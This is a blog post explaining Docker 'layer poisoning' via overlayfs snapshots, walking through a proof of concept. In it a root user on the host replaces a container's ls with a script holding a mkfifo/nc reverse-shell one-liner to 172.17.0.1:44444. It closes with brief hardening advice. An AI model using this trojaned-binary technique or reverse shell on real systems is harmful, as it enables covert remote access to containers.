Layer poisoning - compromising docker through its foundations

This post explains an offensive technique on a Docker host: layer poisoning. I describe Docker/overlayfs layers, then walk through each screenshot from the proof of concept.

1. What is layer poisoning?

Layer poisoning refers to modifying a container layer or docker storage snapshot to inject malicious code into a container. It is not a docker bug by itself, but a consequence of the way docker stores container files via overlayfs layers. If an attacker can access the Docker engine filesystem, they can tamper with files visible to the container.

2. Docker and overlayfs: how do layers work?

Docker builds images in multiple layers. Each container runs with a final filesystem created by stacking:

  • a read-only lowerdir representing the base image (for example Alpine);
  • a read-write upperdir specific to the container;
  • a workdir used by overlayfs to manage write operations.

Overlayfs merges these layers into a single mount point called merged. On the host, Docker/containerd exposes this mount under a path like /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/.

3. Example attack flow

To illustrate the attack, here is one example.

In the first screenshot, I am already root on the host. I pull Alpine and start two sleeping containers called container_prod and container_dev using sleep 9999, so their filesystem snapshots remain available and accessible on the host.

In the second screenshot, I locate the Docker overlay snapshot associated with container_prod by retrieving its container ID and finding the corresponding overlayfs mount. The snapshot reveals a read-only lowerdir, a writable upperdir, and a workdir, which together form the overlay stack I target.

In the third screenshot, I list the snapshot contents. I see a complete filesystem: bin, etc, lib, and so on. The /fs directory corresponds to the filesystem that the container sees.

This is where the compromise happens. I move into the snapshot’s /fs/bin directory, rename the original ls to ls.original, and replace ls with a malicious shell script. The script creates a FIFO at /tmp/f and runs a reverse shell to 172.17.0.1:44444.

The exact command shows the core of the layer poisoning:

mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 44444 > /tmp/f &

Then I make the script executable with chmod +x ls. At this point, the container will see this script instead of the real ls binary.

Finally, I enter the container with:

docker exec -ti container_prod /bin/sh

The screenshot shows that I am inside the container as root, with a normal-looking Alpine filesystem.

In short, this attack shows that a container can be poisoned by modifying its files on the host. If the host is compromised, a Docker container can be compromised too, and overlayfs layers increase the security risk because the attack happens at runtime, not at the image source.

4. Defense and best practices

According to me, the best practice is to never give unauthorized users direct access to containerd files. It is also important to separate the host and the workloads with strict access policies and, if possible, use hardened runtimes or read-only host configurations for Docker hosts.
